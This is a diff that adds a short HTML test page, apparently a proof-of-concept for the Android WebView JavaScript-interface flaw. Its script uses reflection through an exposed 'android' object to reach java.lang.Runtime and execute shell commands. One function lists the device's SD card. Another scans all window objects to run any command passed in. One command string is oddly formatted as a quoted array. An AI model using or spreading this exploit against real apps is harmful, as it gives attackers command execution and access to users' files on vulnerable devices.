@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <h1 id="h">欢迎光临我的路由</h1>
+    <input type="button" value="js调native" onclick="alert(execo())">
+</head>
+<body>
+<script type="text/javascript">
+function sum(i,m){
+    document.getElementById("h").innerHTML= (i+m);
+}
+function ok() {
+ android.toastMessage(android.test());
+}
+
+function execo(cmd){
+    return android.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("['ls','-al','/mnt/sdcard/']");
+}
+
+function exec(cmd){
+     for(var obj in window){
+         alert(obj);
+         if("getClass" in window[obj]){
+            alert(obj);
+            return window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).
+            invoke(null,null).exec(cmd);
+         }
+     }
+}
+</script>
+</body>
+</html>
